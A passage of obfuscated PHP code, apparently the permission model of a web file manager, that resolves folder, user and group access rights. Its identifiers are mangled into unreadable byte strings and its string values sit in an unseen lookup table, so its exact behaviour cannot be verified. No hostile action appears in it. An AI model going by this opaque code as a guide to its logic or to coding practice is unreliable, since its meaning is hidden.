$ü¢¬…¼ê[$´ÏˆµÖş[183]] . $´ÏˆµÖş[50]; if (strstr($ô×§Êß³, $Ö×È±ë )) { $¢†ùƒõƒ[] = $ü¢¬…¼ê[$´ÏˆµÖş[183]]; break; } } } return $this->sourceListAuth($¢†ùƒõƒ); } private function sourceListAuth($ÌÄİœÕ—) { $±´¨ˆÊ‹ =& $_SERVER[Î‹ÃÂŞ„]; $‚ùÒıÔ = Model($±´¨ˆÊ‹[1388])->sourceListInfo($ÌÄİœÕ—, !0); $½ñŒ­­§ = $this->sourceAuthSelect($ÌÄİœÕ—); $‹½å®­Â = array(); $²µøŸ×ô = array(); foreach ($‚ùÒıÔ as $—ûï¯ôâ) { unset($—ûï¯ôâ[$±´¨ˆÊ‹[499]]); unset($—ûï¯ôâ[$±´¨ˆÊ‹[497]]); unset($—ûï¯ôâ[$±´¨ˆÊ‹[457]]); unset($—ûï¯ôâ[$±´¨ˆÊ‹[89]]); $Î°ºœØ = $½ñŒ­­§[$—ûï¯ôâ[$±´¨ˆÊ‹[183]]]; if (!$Î°ºœØ) { continue; } $—ûï¯ôâ[$±´¨ˆÊ‹[2087]] = $this->authTargetInfo($Î°ºœØ); $—ûï¯ôâ[$±´¨ˆÊ‹[554]] = rtrim($—ûï¯ôâ[$±´¨ˆÊ‹[560]], $±´¨ˆÊ‹[8]) . $±´¨ˆÊ‹[8] . ltrim($—ûï¯ôâ[$±´¨ˆÊ‹[554]], $±´¨ˆÊ‹[8]); $‹½å®­Â[] = $—ûï¯ôâ; $µúŸ«Ó = count(explode($±´¨ˆÊ‹[8], trim($—ûï¯ôâ[$±´¨ˆÊ‹[554]], $±´¨ˆÊ‹[8]))); $²µøŸ×ô[] = $µúŸ«Ó + ($—ûï¯ôâ[$±´¨ˆÊ‹[33]] == $±´¨ˆÊ‹[77] ? 0 : 1000); } array_multisort($²µøŸ×ô, SORT_ASC, $‹½å®­Â); return $‹½å®­Â; } private function groupChidldAllRootSource($ò²¾ËÀ²) { $ßèìÍ‘„ =& $_SERVER[Î‹ÃÂŞ„]; $³±„¢•„ = Model($ßèìÍ‘„[2088])->groupChildrenAll($ò²¾ËÀ²); $ªŒ‘£Øõ = array($ßèìÍ‘„[182] => 0, $ßèìÍ‘„[541] => array($ßèìÍ‘„[7], $³±„¢•„), $ßèìÍ‘„[180] => SourceModel::TYPE_GROUP); $Â”éØŒ” = Model($ßèìÍ‘„[872])->field($ßèìÍ‘„[183])->where($ªŒ‘£Øõ)->select(); $Â”éØŒ” = array_to_keyvalue($Â”éØŒ”, $ßèìÍ‘„[12], $ßèìÍ‘„[183]); return $Â”éØŒ”; } private function authTargetInfo($æ¾—Æ©î) { $ÂŸã¦Ç =& $_SERVER[Î‹ÃÂŞ„]; $±Â‘ÖèÙ = array(); $çÌˆÀ¯ = array(); $±©›İÕ¾ = 2 << 25; foreach ($æ¾—Æ©î as $Ì÷àù€¹) { $ÖÉ¢¸œš = Model($ÂŸã¦Ç[543])->listData($Ì÷àù€¹[$ÂŸã¦Ç[2006]]); if (!$ÖÉ¢¸œš) { continue; } if ($Ì÷àù€¹[$ÂŸã¦Ç[180]] == SourceModel::TYPE_USER) { $ığğáŸØ = Model($ÂŸã¦Ç[549])->getInfoSimpleOuter($Ì÷àù€¹[$ÂŸã¦Ç[541]]); if ($ığğáŸØ[$ÂŸã¦Ç[1704]] == $ÂŸã¦Ç[1243]) { continue; } if ($ığğáŸØ[$ÂŸã¦Ç[1704]] == $ÂŸã¦Ç[214]) { $ığğáŸØ[$ÂŸã¦Ç[32]] = LNG($ÂŸã¦Ç[2089]); } } else { $ığğáŸØ = Model($ÂŸã¦Ç[557])->getInfoSimple($Ì÷àù€¹[$ÂŸã¦Ç[541]]); } if (!$ığğáŸØ) { continue; } $ığğáŸØ[$ÂŸã¦Ç[510]] = $ÖÉ¢¸œš; $±Â‘ÖèÙ[] = $ığğáŸØ; $é¤“ş° = 0; if ($Ì÷àù€¹[$ÂŸã¦Ç[180]] == SourceModel::TYPE_GROUP) { $é¤“ş° = $±©›İÕ¾ * 2; } if ($Ì÷àù€¹[$ÂŸã¦Ç[180]] == SourceModel::TYPE_USER) { $é¤“ş° = $±©›İÕ¾; } if ($Ì÷àù€¹[$ÂŸã¦Ç[180]] == SourceModel::TYPE_USER && $Ì÷àù€¹[$ÂŸã¦Ç[541]] == $ÂŸã¦Ç[214]) { $é¤“ş° = 0; } $çÌˆÀ¯[] = $ÖÉ¢¸œš[$ÂŸã¦Ç[457]] + $é¤“ş°; } array_multisort($çÌˆÀ¯, SORT_DESC, $±Â‘ÖèÙ); return $±Â‘ÖèÙ; } public function getAllChildrenByUser($¦«Üì‰è, $ÏşÚÜøÇ) { $ÀÄ¿Ú• =& $_SERVER[Î‹ÃÂŞ„]; $£¢ÃŠÒ = Model($ÀÄ¿Ú•[570])->getInfo($ÏşÚÜøÇ); if (!$ÏşÚÜøÇ || !$¦«Üì‰è || !$£¢ÃŠÒ) { return array(); } $‰äÀœ³˜ = Model($ÀÄ¿Ú•[1388])->sourceInfo($¦«Üì‰è); $»¤«©Î¹ = array(); $Î‘›††¾ = 1; if ($‰äÀœ³˜[$ÀÄ¿Ú•[182]] == $ÀÄ¿Ú•[214] && $‰äÀœ³˜[$ÀÄ¿Ú•[541]] != $Î‘›††¾ && $this->groupContainUser($‰äÀœ³˜[$ÀÄ¿Ú•[541]], $ÏşÚÜøÇ)) { foreach ($£¢ÃŠÒ[$ÀÄ¿Ú•[2090]] as $¦’»¹‹) { $Íö†¼Í = Model($ÀÄ¿Ú•[557])->getInfo($¦’»¹‹[$ÀÄ¿Ú•[1902]]); $ÒÂÂ­œ = Model($ÀÄ¿Ú•[570])->getInfoSimpleOuter($ÏşÚÜøÇ); $ÒÂÂ­œ[$ÀÄ¿Ú•[510]] = $¦’»¹‹[$ÀÄ¿Ú•[457]]; if (Model($ÀÄ¿Ú•[543])->authCheckAction($¦’»¹‹[$ÀÄ¿Ú•[457]][$ÀÄ¿Ú•[457]], $ÀÄ¿Ú•[1923])) { continue; } $ŒÈó˜Çı = array($ÀÄ¿Ú•[32] => $ÀÄ¿Ú•[1263] . $Íö†¼Í[$ÀÄ¿Ú•[32]], $ÀÄ¿Ú•[183] => $Íö†¼Í[$ÀÄ¿Ú•[89]][$ÀÄ¿Ú•[183]], $ÀÄ¿Ú•[86] => KodIO::make($Íö†¼Í[$ÀÄ¿Ú•[89]][$ÀÄ¿Ú•[183]]), $ÀÄ¿Ú•[182] => $ÀÄ¿Ú•[214], $ÀÄ¿Ú•[180] => $ÀÄ¿Ú•[550], $ÀÄ¿Ú•[33] => $ÀÄ¿Ú•[587], $ÀÄ¿Ú•[554] => $Íö†¼Í[$ÀÄ¿Ú•[561]], $ÀÄ¿Ú•[1902] => $Íö†¼Í[$ÀÄ¿Ú•[1902]], $ÀÄ¿Ú•[558] => $Íö†¼Í[$ÀÄ¿Ú•[182]], $ÀÄ¿Ú•[2087] => array($ÒÂÂ­œ)); $»¤«©Î¹[$ŒÈó˜Çı[$ÀÄ¿Ú•[183]]] = $ŒÈó˜Çı; } } $šÇŒ…§Î = array(); $•ÙšÉÑå = $this->getAllChildren($¦«Üì‰è); foreach ($•ÙšÉÑå as $½Ú¼Ş) { $ÙÉ’„ÇŒ = !1; foreach ($½Ú¼Ş[$ÀÄ¿Ú•[2087]] as $üŒ»¶¼¯) { if ($üŒ»¶¼¯[$ÀÄ¿Ú•[1704]]) { if ($üŒ»¶¼¯[$ÀÄ¿Ú•[1704]] == $ÏşÚÜøÇ) { $ÙÉ’„ÇŒ = !0; break; } } if ($üŒ»¶¼¯[$ÀÄ¿Ú•[1902]]) { if ($this->groupContainUser($üŒ»¶¼¯[$ÀÄ¿Ú•[1902]], $ÏşÚÜøÇ)) { $ÙÉ’„ÇŒ = !0; break; } } } if ($ÙÉ’„ÇŒ) { $šÇŒ…§Î[] = $½Ú¼Ş; } $Š»É¥›ü = $½Ú¼Ş[$ÀÄ¿Ú•[183]]; if (isset($»¤«©Î¹[$Š»É¥›ü])) { $½Ú¼Ş[$ÀÄ¿Ú•[2087]][] = $»¤«©Î¹[$Š»É¥›ü][0]; $»¤«©Î¹[$Š»É¥›ü] = !1; } } $»¤«©Î¹ = array_filter(array_values($»¤«©Î¹)); $šÇŒ…§Î = array_merge($»¤«©Î¹, $šÇŒ…§Î); return $šÇŒ…§Î; } public function setAllChildrenByUser($ñÛ‡ªÑ, $Ú‡İıƒĞ, $­š÷¢ö½) { $î°ìÄ› =& $_SERVER[Î‹ÃÂŞ„]; $‡Š•ü¿ = $this->getAllChildrenByUser($ñÛ‡ªÑ, $Ú‡İıƒĞ); if (!$­š÷¢ö½ || !$‡Š•ü¿) { return !1; } foreach ($‡Š•ü¿ as $ö¶œş§µ) { $Š÷¼‡É = array(); foreach ($ö¶œş§µ[$î°ìÄ›[2087]] as $ûÖ¸ «ú) { $¿†Ç“â¬ = $ûÖ¸ «ú[$î°ìÄ›[510]]; $îãİ×Îï = $ûÖ¸ «ú[$î°ìÄ›[1704]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $€Ã±İĞÆ = $ûÖ¸ «ú[$î°ìÄ›[1704]] ? $ûÖ¸ «ú[$î°ìÄ›[1704]] : $ûÖ¸ «ú[$î°ìÄ›[1902]]; if ($ûÖ¸ «ú[$î°ìÄ›[1704]] && $ûÖ¸ «ú[$î°ìÄ›[1704]] == $Ú‡İıƒĞ) { continue; } $Š÷¼‡É[] = array($î°ìÄ›[183] => $ö¶œş§µ[$î°ìÄ›[183]], $î°ìÄ›[180] => $îãİ×Îï, $î°ìÄ›[541] => intval($€Ã±İĞÆ), $î°ìÄ›[2006] => isset($¿†Ç“â¬[$î°ìÄ›[445]]) ? intval($¿†Ç“â¬[$î°ìÄ›[445]]) : 0, $î°ìÄ›[2067] => isset($¿†Ç“â¬[$î°ìÄ›[2067]]) ? intval($¿†Ç“â¬[$î°ìÄ›[2067]]) : -1); } $Š÷¼‡É[] = array($î°ìÄ›[183] => $ö¶œş§µ[$î°ìÄ›[183]], $î°ìÄ›[180] => SourceModel::TYPE_USER, $î°ìÄ›[541] => intval($Ú‡İıƒĞ), $î°ìÄ›[2006] => intval($­š÷¢ö½), $î°ìÄ›[2067] => -1); $this->where(array($î°ìÄ›[461] => $ö¶œş§µ[$î°ìÄ›[183]]))->delete(); $this->addAll($Š÷¼‡É); } return !0; } public function get($ñ¢è¶Œ) { $°–ä¹³ = $this->getSourceList(array($ñ¢è¶Œ), !0); return $°–ä¹³[0]; } public function getSourceList($…«î·åÉ, $¦—ğø° = false, $ó´¹òâª = false) { $øñ æ† =& $_SERVER[Î‹ÃÂŞ„]; if (!$…«î·åÉ) { return array(); } $Ê×€Í¿£ = Model($øñ æ†[1388]); if (!$¦—ğø° && count($…«î·åÉ) == 1) { $¦—ğø° = array(); $¦—ğø°[$…«î·åÉ[0]] = $Ê×€Í¿£->sourceInfo($…«î·åÉ[0]); } if (!$¦—ğø°) { $Â›ÀüÀ = array($øñ æ†[461] => array($øñ æ†[462], $…«î·åÉ)); $¦—ğø° = $Ê×€Í¿£->field($øñ æ†[2091])->where($Â›ÀüÀ)->select(); $¦—ğø° = array_to_keyvalue($¦—ğø°, $øñ æ†[183]); } $¥‘‰’¤§ = $…«î·åÉ; foreach ($¦—ğø° as $îî·üç‹ => $©ÒÕ™¸Œ) { $àÈë²‡é = $Ê×€Í¿£->parentLevelArray($©ÒÕ™¸Œ[$øñ æ†[556]]); $¥‘‰’¤§ = array_merge($¥‘‰’¤§, array($îî·üç‹), array_reverse($àÈë²‡é)); } $¥‘‰’¤§ = array_values(array_unique($¥‘‰’¤§)); if (!$¥‘‰’¤§) { return array(); } $’´şÔº = $this->sourceAuthSelect($¥‘‰’¤§); $û‘óŸÌ¾ = array(); foreach ($¥‘‰’¤§ as $è³äâ¶ê) { if (isset($’´şÔº[$è³äâ¶ê])) { $û‘óŸÌ¾[$è³äâ¶ê] = $’´şÔº[$è³äâ¶ê]; } } $âê¾·¤Œ = $this->userIsRoot($ó´¹òâª); $ÏæôòÀ = AuthModel::authAll(); $Õšù‹˜ = array($øñ æ†[458] => $ÏæôòÀ, $øñ æ†[2092] => array($øñ æ†[463] => 0, $øñ æ†[1908] => $ÏæôòÀ, $øñ æ†[464] => LNG($øñ æ†[2093]), $øñ æ†[1925] => $øñ æ†[2094])); $ÁÜ¤È¥Æ = array(); foreach ($¦—ğø° as $è³äâ¶ê => $€ä™ò„€) { if ($âê¾·¤Œ && $GLOBALS[$øñ æ†[6]][$øñ æ†[1921]]) { $ÁÜ¤È¥Æ[$è³äâ¶ê] = $Õšù‹˜; continue; } $ÁÜ¤È¥Æ[$è³äâ¶ê] = $this->makeSourceAuth($€ä™ò„€, $û‘óŸÌ¾, $ó´¹òâª); } return $ÁÜ¤È¥Æ; } public function authDeepCheck($¬–ùÏ°±, $ÍåâŒù° = false) { $”°Ù¥œƒ =& $_SERVER[Î‹ÃÂŞ„]; $ÍåâŒù° = $ÍåâŒù° ? $ÍåâŒù° : USER_ID; $²®Ò¾ÌÀ = $this->makeAuthDeep($ÍåâŒù°); if (!in_array($¬–ùÏ°±, $²®Ò¾ÌÀ[$”°Ù¥œƒ[2095]])) { return !1; } $«Òó¢Ô = array(); foreach ($²®Ò¾ÌÀ[$”°Ù¥œƒ[2096]] as $şÓõº => $ø×ÃŒÇ±) { if (!in_array($¬–ùÏ°±, $ø×ÃŒÇ±)) { continue; } $«Òó¢Ô[] = $şÓõº; } if (!$«Òó¢Ô) { return !1; } $ôñ‚ö»› = $«Òó¢Ô ? $«Òó¢Ô[0] : $¬–ùÏ°±; return array($”°Ù¥œƒ[458] => -1, $”°Ù¥œƒ[510] => array($”°Ù¥œƒ[463] => $”°Ù¥œƒ[1243], $”°Ù¥œƒ[1908] => $”°Ù¥œƒ[214], $”°Ù¥œƒ[464] => LNG($”°Ù¥œƒ[2097]), $”°Ù¥œƒ[1925] => $”°Ù¥œƒ[2098]), $”°Ù¥œƒ[2099] => LNG($”°Ù¥œƒ[2100]), $”°Ù¥œƒ[2101] => $this->sourceAuthInfo($ôñ‚ö»›)); } protected function makeAuthDeep($Â¸„¦ú = false) { $äØ¬Ò•¿ =& $_SERVER[Î‹ÃÂŞ„]; static $€Ë˜—èŒ = array(); $Â¸„¦ú = $Â¸„¦ú ? $Â¸„¦ú : USER_ID; if (isset($€Ë˜—èŒ[$Â¸„¦ú])) { return $€Ë˜—èŒ[$Â¸„¦ú]; } $¿éí†»ƒ = Model($äØ¬Ò•¿[2102])->listData(); $Šæ€¾Ğ = array(); foreach ($¿éí†»ƒ as $—ã‡áôÕ) { if ($—ã‡áôÕ[$äØ¬Ò•¿[457]] == 0 && $—ã‡áôÕ[$äØ¬Ò•¿[1924]] == $äØ¬Ò•¿[90]) { $Šæ€¾Ğ[] = $—ã‡áôÕ[$äØ¬Ò•¿[445]]; } } $İĞçëš = $this->userGroupParents($Â¸„¦ú); $íí¥Š¡ó = array($äØ¬Ò•¿[180] => SourceModel::TYPE_USER, $äØ¬Ò•¿[541] => $Â¸„¦ú); if ($İĞçëš) { $íí¥Š¡ó = array(array($äØ¬Ò•¿[180] => SourceModel::TYPE_USER, $äØ¬Ò•¿[541] => $Â¸„¦ú), array($äØ¬Ò•¿[180] => SourceModel::TYPE_GROUP, $äØ¬Ò•¿[541] => array($äØ¬Ò•¿[462], $İĞçëš)), $äØ¬Ò•¿[1055] => $äØ¬Ò•¿[2000]); } $Ê›«ã˜ = $this->field($äØ¬Ò•¿[2103])->where($íí¥Š¡ó)->select(); $—ô’¥Â— = array(); $´Æ±Áüù = array_to_keyvalue_group($Ê›«ã˜, $äØ¬Ò•¿[183]); foreach ($´Æ±Áüù as $«Ÿ›¥·³ => $‚·íü–å) { $Ïß²¢­á = $this->authArrayCheck($‚·íü–å, $Â¸„¦ú); if ($Ïß²¢­á[$äØ¬Ò•¿[458]] > 0) { $—ô’¥Â—[] = $«Ÿ›¥·³ . $äØ¬Ò•¿[12]; } } if ($İĞçëš) { $¤„¨ùÂû = Model($äØ¬Ò•¿[557]); foreach ($İĞçëš as $ÂÔéãÄµ) { $½ÀË¿Ñ = $¤„¨ùÂû->getInfo($ÂÔéãÄµ); if (!$½ÀË¿Ñ || !is_array($½ÀË¿Ñ[$äØ¬Ò•¿[89]])) { continue; } $—ô’¥Â—[] = $½ÀË¿Ñ[$äØ¬Ò•¿[89]][$äØ¬Ò•¿[183]]; } } $û‘¨ß² = array(); $¢Ò´äøÙ = $İĞçëš; $úê¿Ó = Model($äØ¬Ò•¿[1388]); $¤„¨ùÂû = Model($äØ¬Ò•¿[557]); $£àäÙÂ = array(); $½°‘·üŒ = array(); $éÅÅ÷£É = array(); $èÚÌ»÷î = array(); if ($—ô’¥Â—) { $ŒÛ³ùå = $úê¿Ó->where(array($äØ¬Ò•¿[183] => array($äØ¬Ò•¿[462], $—ô’¥Â—)))->select(); foreach ($ŒÛ³ùå as $é¤·…¡¯) { $¬ÖĞıÆ± = $úê¿Ó->parentLevelArray($é¤·…¡¯[$äØ¬Ò•¿[556]]); $û‘¨ß² = array_merge($û‘¨ß², $¬ÖĞıÆ±); $¢Ò´äøÙ[] = $é¤·…¡¯[$äØ¬Ò•¿[541]]; $£àäÙÂ[$é¤·…¡¯[$äØ¬Ò•¿[183]]] = $¬ÖĞıÆ±; $½°‘·üŒ[$é¤·…¡¯[$äØ¬Ò•¿[183]]] = $é¤·…¡¯[$äØ¬Ò•¿[541]]; } } $¢Ò´äøÙ = array_values(array_unique($¢Ò´äøÙ)); $÷ã„òì¨ = $¢Ò´äøÙ; foreach ($÷ã„òì¨ as $ÂÔéãÄµ) { $½ÀË¿Ñ = $¤„¨ùÂû->getInfo($ÂÔéãÄµ); $¬ÖĞıÆ± = $úê¿Ó->parentLevelArray($½ÀË¿Ñ[$äØ¬Ò•¿[556]]); $¢Ò´äøÙ = array_merge($¢Ò´äøÙ, $¬ÖĞıÆ±); } $¢Ò´äøÙ = array_values(array_unique($¢Ò´äøÙ)); foreach ($¢Ò´äøÙ as $ÂÔéãÄµ) { $½ÀË¿Ñ = $¤„¨ùÂû->getInfo($ÂÔéãÄµ); $û‘¨ß²[] = $½ÀË¿Ñ[$äØ¬Ò•¿[89]][$äØ¬Ò•¿[183]]; $éÅÅ÷£É[$ÂÔéãÄµ] = $½ÀË¿Ñ[$äØ¬Ò•¿[89]][$äØ¬Ò•¿[183]]; $èÚÌ»÷î[$ÂÔéãÄµ] = $úê¿Ó->parentLevelArray($½ÀË¿Ñ[$äØ¬Ò•¿[556]]); } foreach ($£àäÙÂ as $œ–¾¥é³ => $ÅÀÆ°ÅÚ) { $™¿¸²—ß = $½°‘·üŒ[$œ–¾¥é³]; if (!$™¿¸²—ß || !$éÅÅ÷£É[$™¿¸²—ß]) { continue; } $İ’íËÒÆ = array(); foreach ($èÚÌ»÷î[$™¿¸²—ß] as $ÂÔéãÄµ) { $İ’íËÒÆ[] = $éÅÅ÷£É[$ÂÔéãÄµ]; } $£àäÙÂ[$œ–¾¥é³] = array_merge($İ’íËÒÆ, $ÅÀÆ°ÅÚ); } $û‘¨ß² = array_values(array_unique($û‘¨ß²)); $š»’Ç²Ú = array($äØ¬Ò•¿[2095] => $û‘¨ß², $äØ¬Ò•¿[2096] => $£àäÙÂ); $€Ë˜—èŒ[$Â¸„¦ú] = $š»’Ç²Ú; return $š»’Ç²Ú; } private function makeSourceAuth($œ‘üüêß, $ãÓÕİÕã, $¿ÔòîŸÓ = false) { $Ü¦–¥î =& $_SERVER[Î‹ÃÂŞ„]; $éÛƒà‡ = $Ü¦–¥î[90]; $ëğ°æğª = $œ‘üüêß[$Ü¦–¥î[541]]; $Ôà¬«üÔ = $œ‘üüêß[$Ü¦–¥î[180]] == SourceModel::TYPE_GROUP; $ÍÖ¦ÚåŸ = $Ôà¬«üÔ ? $this->groupRootAuth($ëğ°æğª, $¿ÔòîŸÓ) : !1; if ($ÍÖ¦ÚåŸ && Model($Ü¦–¥î[543])->authCheckAction($ÍÖ¦ÚåŸ[$Ü¦–¥î[457]], $Ü¦–¥î[1923])) { return $this->groupAuthInfo($ÍÖ¦ÚåŸ, $ëğ°æğª); } $Éû­ÒÚ’ = Model($Ü¦–¥î[1388])->parentLevelArray($œ‘üüêß[$Ü¦–¥î[556]]); $Éû­ÒÚ’ = array_merge(array($œ‘üüêß[$Ü¦–¥î[183]]), array_reverse($Éû­ÒÚ’)); $ÛèÕˆ = !1; foreach ($Éû­ÒÚ’ as $›ƒà“…¨) { if (!isset($ãÓÕİÕã[$›ƒà“…¨])) { continue; } $ØÕ©‡ıÉ = $this->authMake($ãÓÕİÕã[$›ƒà“…¨], $¿ÔòîŸÓ); if ($ØÕ©‡ıÉ[$Ü¦–¥î[510]]) { $ÛèÕˆ = $ØÕ©‡ıÉ; break; } } if (!$Ôà¬«üÔ) { return $ÛèÕˆ; } if (!$ÛèÕˆ && $ÍÖ¦ÚåŸ) { $ÛèÕˆ = $this->groupAuthInfo($ÍÖ¦ÚåŸ, $ëğ°æğª); } if (!$ÛèÕˆ) { $Âö­Èúö = Model($Ü¦–¥î[557])->getInfo($ëğ°æğª); $Ãô•‹‡¯ = explode($Ü¦–¥î[50], trim($Âö­Èúö[$Ü¦–¥î[556]], $Ü¦–¥î[50])); $Ãô•‹‡¯ = array_reverse($Ãô•‹‡¯); foreach ($Ãô•‹‡¯ as $äéà¸—Ä) { if ($äéà¸—Ä == $Ü¦–¥î[214] || $äéà¸—Ä == $éÛƒà‡) { continue; } $Ã¬İÜš» = $this->groupRootAuth($äéà¸—Ä, $¿ÔòîŸÓ); if (!$Ã¬İÜš») { continue; } $ÛèÕˆ = $this->groupAuthInfo($Ã¬İÜš», $äéà¸—Ä); break; } } if (!$ÛèÕˆ || $ÛèÕˆ[$Ü¦–¥î[458]] <= 0) { $£Ü˜ÕÆ = $this->authDeepCheck($œ‘üüêß[$Ü¦–¥î[183]], $¿ÔòîŸÓ); if ($£Ü˜ÕÆ) { $ÛèÕˆ = $£Ü˜ÕÆ; } } return $ÛèÕˆ; } private function userIsRoot($Ôú­óİ£ = false) { $“ÅÆ–É° =& $_SERVER[Î‹ÃÂŞ„]; if (!$Ôú­óİ£ && _get($GLOBALS, $“ÅÆ–É°[539])) { return !0; } $ëˆäß› = Model($“ÅÆ–É°[570])->getInfo($Ôú­óİ£); $Ëíœ¤ÑÓ = Model($“ÅÆ–É°[2104])->listData($ëˆäß›[$“ÅÆ–É°[1578]]); if ($Ëíœ¤ÑÓ && $Ëíœ¤ÑÓ[$“ÅÆ–É°[547]][$“ÅÆ–É°[2105]] == 1) { return !0; } return !1; } private function sourceAuthInfo($çş®óè’) { $şªòÇ¥‚ =& $_SERVER[Î‹ÃÂŞ„]; $œßá“¡› = Model($şªòÇ¥‚[1388]); $É±ºÁˆ = $œßá“¡›->sourceInfo($çş®óè’); if (!$É±ºÁˆ) { return !1; } $œßá“¡›->groupPathDisplay($É±ºÁˆ); $—è­ëÂå = array($É±ºÁˆ); $—è­ëÂå = $œßá“¡›->_listAppendPath($—è­ëÂå); $É±ºÁˆ = $—è­ëÂå[0]; $ø¹­Ñçö = $É±ºÁˆ[$şªòÇ¥‚[554]]; if (isset($É±ºÁˆ[$şªòÇ¥‚[562]])) { $‘•êÜ–° = explode($şªòÇ¥‚[8], trim($É±ºÁˆ[$şªòÇ¥‚[554]], $şªòÇ¥‚[8])); array_shift($‘•êÜ–°); $ø¹­Ñçö = $É±ºÁˆ[$şªòÇ¥‚[560]] . $şªòÇ¥‚[2106] . implode($şªòÇ¥‚[8], $‘•êÜ–°); } return array($şªòÇ¥‚[464] => $É±ºÁˆ[$şªòÇ¥‚[32]], $şªòÇ¥‚[86] => KodIO::make($É±ºÁˆ[$şªòÇ¥‚[183]]), $şªòÇ¥‚[2107] => $ø¹­Ñçö); } private function groupAuthInfo($°ûĞêß, $ÚŞ¬ÇØ) { $®ˆ¯ŒÔ† =& $_SERVER[Î‹ÃÂŞ„]; $»Ÿ÷Ÿº” = Model($®ˆ¯ŒÔ†[557])->getInfo($ÚŞ¬ÇØ); return array($®ˆ¯ŒÔ†[2108] => intval($°ûĞêß[$®ˆ¯ŒÔ†[457]]), $®ˆ¯ŒÔ†[2092] => $°ûĞêß, $®ˆ¯ŒÔ†[2109] => LNG($®ˆ¯ŒÔ†[2110]), $®ˆ¯ŒÔ†[2101] => array($®ˆ¯ŒÔ†[464] => $»Ÿ÷Ÿº”[$®ˆ¯ŒÔ†[32]], $®ˆ¯ŒÔ†[86] => KodIO::make($»Ÿ÷Ÿº”[$®ˆ¯ŒÔ†[89]][$®ˆ¯ŒÔ†[183]]), $®ˆ¯ŒÔ†[2107] => $»Ÿ÷Ÿº”[$®ˆ¯ŒÔ†[561]])); } protected function groupRootAuth($çÁ—ëòö, $“ª«Ù = false) { $¼–ô¡¸Û =& $_SERVER[Î‹ÃÂŞ„]; $“ª«Ù = $“ª«Ù ? $“ª«Ù : USER_ID; $Ñ¸õÛü¼ = $“ª«Ù . $¼–ô¡¸Û[2111] . $çÁ—ëòö; static $œ“Ûé­ = array(); if (isset($œ“Ûé­[$Ñ¸õÛü¼])) { return $œ“Ûé­[$Ñ¸õÛü¼]; } $£íüá´Õ = Model($¼–ô¡¸Û[557])->getInfo($çÁ—ëòö); $ä¨Ã½×û = $this->userGroupList($“ª«Ù); $—¬ù†ñû = isset($ä¨Ã½×û[$çÁ—ëòö]) ? $ä¨Ã½×û[$çÁ—ëòö][$¼–ô¡¸Û[457]] : !1; if ($—¬ù†ñû && Model($¼–ô¡¸Û[543])->authCheckAction($—¬ù†ñû[$¼–ô¡¸Û[457]], $¼–ô¡¸Û[1923])) { $œ“Ûé­[$Ñ¸õÛü¼] = $—¬ù†ñû; return $—¬ù†ñû; } $½¯Ğùª¢ = $this->sourceAuthSelect($£íüá´Õ[$¼–ô¡¸Û[89]][$¼–ô¡¸Û[183]]); $çÖÌÃ‡ = $½¯Ğùª¢ ? $this->authMake($½¯Ğùª¢, $“ª«Ù) : !1; $£è…ŠÕ£ = $çÖÌÃ‡ ? $çÖÌÃ‡[$¼–ô¡¸Û[510]] : !1; $œ“Ûé­[$Ñ¸õÛü¼] = $£è…ŠÕ£ ? $£è…ŠÕ£ : $—¬ù†ñû; return $œ“Ûé­[$Ñ¸õÛü¼]; } public function authOwnerApply($„¹Ó¸») { $‘Ùëåîõ =& $_SERVER[Î‹ÃÂŞ„]; if (empty($„¹Ó¸»[$‘Ùëåîõ[457]]) || isset($„¹Ó¸»[$‘Ùëåîõ[2112]]) && $„¹Ó¸»[$‘Ùëåîõ[2112]]) { return $„¹Ó¸»; } if (AuthModel::authCheckRoot($„¹Ó¸»[$‘Ùëåîõ[457]][$‘Ùëåîõ[458]])) { return $„¹Ó¸»; } $²ø¾ô¤ˆ = Model($‘Ùëåîõ[1388])->parentLevelArray($„¹Ó¸»[$‘Ùëåîõ[556]]); $²ø¾ô¤ˆ = array_merge(array($„¹Ó¸»[$‘Ùëåîõ[183]]), array_reverse($²ø¾ô¤ˆ)); $­à¯Æ¦Û = $this->sourceAuthSelect($²ø¾ô¤ˆ); $ÉÖÀØ¿Ñ = array(); $´Ó´—²” = array(); foreach ($­à¯Æ¦Û as $—ºö—ü¨ => $¸ò„£ßı) { $çÌüˆ = $this->authFolderOwnerUser($¸ò„£ßı); $ÉÖÀØ¿Ñ[$—ºö—ü¨] = $çÌüˆ; $´Ó´—²” = array_merge($´Ó´—²”, $çÌüˆ[$‘Ùëåîõ[633]]); if ($çÌüˆ[$‘Ùëåîõ[2113]]) { break; } } if (count($´Ó´—²”) == 0) { $´Ó´—²” = $this->authFolderOwnerGroup($„¹Ó¸»[$‘Ùëåîõ[541]]); } $´Ó´—²” = array_unique($´Ó´—²”); if (AuthModel::authCheckRoot($„¹Ó¸»[$‘Ùëåîõ[457]][$‘Ùëåîõ[458]])) { $´Ó´—²”[] = USER_ID; } $„¹Ó¸»[$‘Ùëåîõ[457]][$‘Ùëåîõ[2114]] = Model($‘Ùëåîõ[549])->userListInfo($´Ó´—²”); return $„¹Ó¸»; } private function authFolderOwnerGroup($‰Šƒ¡¦¦) { $Ì•¸ƒˆë =& $_SERVER[Î‹ÃÂŞ„]; $§ŸûØÆ‰ = Model($Ì•¸ƒˆë[1992])->where(array($Ì•¸ƒˆë[1902] => $‰Šƒ¡¦¦))->select(); $„ÇãÚ÷î = array(); if (!$§ŸûØÆ‰) { return $„ÇãÚ÷î; } foreach ($§ŸûØÆ‰ as $œ¯®óÚÄ) { $Â³¯«‰ˆ = $this->authInfo($œ¯®óÚÄ); if (AuthModel::authCheckRoot($Â³¯«‰ˆ[$Ì•¸ƒˆë[457]])) { $„ÇãÚ÷î[] = $œ¯®óÚÄ[$Ì•¸ƒˆë[1704]]; } } return $„ÇãÚ÷î; } private function authFolderOwnerUser($Âµí•Û) { $±„üş–£ =& $_SERVER[Î‹ÃÂŞ„]; $òÁ“Òñ = array(); $“ÆÎ¶Ø½ = !1; foreach ($Âµí•Û as $¨­¤İÌ) { $ô‚¡è’ˆ = $this->authInfo($¨­¤İÌ); if ($¨­¤İÌ[$±„üş–£[541]] == $±„üş–£[214]) { $“ÆÎ¶Ø½ = !0; } if ($¨­¤İÌ[$±„üş–£[180]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ô‚¡è’ˆ[$±„üş–£[457]])) { $òÁ“Òñ[] = $¨­¤İÌ[$±„üş–£[541]]; } } } return array($±„üş–£[633] => $òÁ“Òñ, $±„üş–£[2113] => $“ÆÎ¶Ø½); } public function authMake($Ô èçÆ«, $ÊÉíÁƒŸ = false) { $¿ŠÎîĞÊ =& 